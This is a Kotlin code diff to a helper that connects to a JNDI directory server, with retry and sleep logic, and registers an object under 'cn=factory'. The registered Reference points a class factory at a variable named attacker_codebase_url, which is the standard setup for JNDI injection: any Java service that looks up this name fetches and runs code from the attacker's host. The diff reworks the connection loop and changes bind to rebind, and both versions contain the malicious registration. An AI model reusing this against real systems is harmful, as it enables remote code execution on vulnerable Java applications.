@@ -6,6 +6,7 @@ import javax.naming.InitialContext
 import javax.naming.Reference
 
 import javax.naming.CommunicationException
+import javax.naming.directory.InvalidAttributeValueException
 
 
 // Default addresses to use in case none were specified at the command-line
@@ -53,28 +54,32 @@ fun main() {
     // The server might not be up when we first start this service, so we loop
     //  until we're able to connect. That's all the helper function does. Aside
     //  from the looping, it just does `InitialContext(env)`.
-    var ctx: Context = getContext(env)
-    println("Connected!")
-
-    // Add the reference to the registry
-    ctx.bind(
-        "cn=factory",
-        Reference("MadeClass", "Factory", attacker_codebase_url)
-    );
-
-    // For good measure
-    ctx.close()
-}
-
-
-fun getContext(env: Hashtable<String,String>): Context {
-    while(true) {
+    var ctx: Context? = null
+    while(ctx == null) {
         try {
-            InitialContext(env)
+            // The server might prematurely accept our connection
+            // Resolve this in the most jank way possible - by sleeping. It
+            //  takes about two seconds for the setup to finish on my computer,
+            //  so sleep for five.
+            ctx = InitialContext(env)
+            println("Connected!")
+            Thread.sleep(5000)
+
         } catch(_: CommunicationException) {
             println("Failed to connect.")
             println("Retrying after 1 second...")
             Thread.sleep(1000)
         }
     }
+
+    // Add the reference to the registry
+    // Use `rebind` instead of `bind` if something was already there from a
+    //  previous run
+    ctx.rebind(
+        "cn=factory",
+        Reference("MadeClass", "Factory", attacker_codebase_url)
+    )
+
+    // For good measure
+    ctx.close()
 }
